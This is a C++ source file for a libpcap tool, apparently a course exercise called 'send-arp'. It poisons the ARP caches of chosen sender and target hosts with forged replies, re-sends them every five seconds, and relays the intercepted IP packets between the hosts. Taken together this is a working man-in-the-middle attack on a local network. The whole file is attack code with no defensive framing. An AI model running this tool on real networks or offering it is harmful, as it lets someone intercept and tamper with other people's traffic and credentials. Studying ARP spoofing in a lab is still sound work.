#include <cstdio>
#include <pcap.h>
#include <unistd.h>
#include <array>
#include <string>
#include <thread>
#include <vector>
#include <netinet/ip.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include "ethhdr.h"
#include "arphdr.h"

using namespace std;
#define MAC_ADDR_LEN 6
#pragma pack(push, 1)

struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};

#pragma pack(pop)

struct IPv4hdr {
    uint8_t ihl : 4, version : 4;
    uint8_t tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag_off;
    uint8_t ttl;
    uint8_t protocol;
    uint16_t check;
    uint32_t srcaddr;
    uint32_t dstaddr;
};

bool get_mac_address(const string& if_name, uint8_t* mac_addr_buf) {
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock == -1) {
        return false;
    }
    strncpy(ifr.ifr_name, if_name.c_str(), IFNAMSIZ);
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) == -1) {
        close(sock);
        return false;
    }
    close(sock);
    memcpy(mac_addr_buf, ifr.ifr_hwaddr.sa_data, MAC_ADDR_LEN);
    return true;
}

void infect_with_arp(pcap_t* handle, const Ip attacker_ip, const Mac attacker_mac, const Ip sender_ip, Mac& sender_mac) {
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
    packet.eth_.smac_ = attacker_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = attacker_mac;
    packet.arp_.sip_ = htonl(attacker_ip);
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(sender_ip);

    pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* replyPacket;
        int res = pcap_next_ex(handle, &header, &replyPacket);
        if (res == 0) continue;
        if (res < 0) return;

        EthArpPacket* receivedPacket = (EthArpPacket*)replyPacket;

        if (ntohs(receivedPacket->eth_.type_) == EthHdr::Arp &&
            ntohs(receivedPacket->arp_.op_) == ArpHdr::Reply &&
            ntohl(receivedPacket->arp_.sip_) == static_cast<uint32_t>(sender_ip) &&
            ntohl(receivedPacket->arp_.tip_) == static_cast<uint32_t>(attacker_ip)) {

            sender_mac = receivedPacket->arp_.smac_;
            return;
        }
    }
}

void arp_infect(int argc, char *argv[], int i, const Mac& attacker_mac) {
    char* dev = argv[1];
    char* sender_ip_str = argv[2 * i];
    char* target_ip_str = argv[2 * i + 1];

    while (true) {
        sleep(5); 

        pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, nullptr);
        if (handle == nullptr) {
            return;
        }

        Mac sender_mac;
        infect_with_arp(handle, Ip(target_ip_str), attacker_mac, Ip(sender_ip_str), sender_mac);

        EthArpPacket packet;
        packet.eth_.dmac_ = sender_mac;
        packet.eth_.smac_ = attacker_mac;
        packet.eth_.type_ = htons(EthHdr::Arp);

        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Reply);
        packet.arp_.smac_ = attacker_mac;
        packet.arp_.sip_ = htonl(Ip(target_ip_str));
        packet.arp_.tmac_ = sender_mac;
        packet.arp_.tip_ = htonl(Ip(sender_ip_str));

        pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        pcap_close(handle);
    }
}

void relay_packets(pcap_t* handle, const Ip& sender_ip, const Ip& target_ip, const Mac& sender_mac, const Mac& attacker_mac, const Mac& target_mac) {
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res < 0) break;

        EthHdr* eth = (EthHdr*)packet;
        if (eth->type() == EthHdr::Ip4) {
            IPv4hdr* iphdr = (IPv4hdr*)(packet + sizeof(EthHdr));
            if (iphdr->srcaddr == htonl(sender_ip)) {
                eth->smac_ = attacker_mac;
                eth->dmac_ = target_mac;
            } else if (iphdr->dstaddr == htonl(sender_ip)) {
                eth->smac_ = attacker_mac;
                eth->dmac_ = sender_mac;
            }

            pcap_sendpacket(handle, packet, header->caplen);
        }
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc - 2) % 2 != 0) {
        printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
        return -1;
    }

    char* dev = argv[1];
    string dev_str = string(dev);
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        return -1;
    }

    uint8_t attacker_mac[MAC_ADDR_LEN];
    if (!get_mac_address(dev_str, attacker_mac)) {
        return -1;
    }

    vector<thread> threads;
    for (int i = 2; i < argc; i += 2) {
        Ip sender_ip = Ip(argv[i]);
        Ip target_ip = Ip(argv[i + 1]);

        Mac sender_mac, target_mac;
        infect_with_arp(handle, target_ip, Mac(attacker_mac), sender_ip, sender_mac);
        infect_with_arp(handle, sender_ip, Mac(attacker_mac), target_ip, target_mac);

        threads.push_back(thread(arp_infect, argc, argv, i / 2, Mac(attacker_mac)));
        threads.push_back(thread(relay_packets, handle, sender_ip, target_ip, sender_mac, Mac(attacker_mac), target_mac));
    }

    for (auto& th : threads) {
        th.join();
    }

    pcap_close(handle);
    return 0;
}
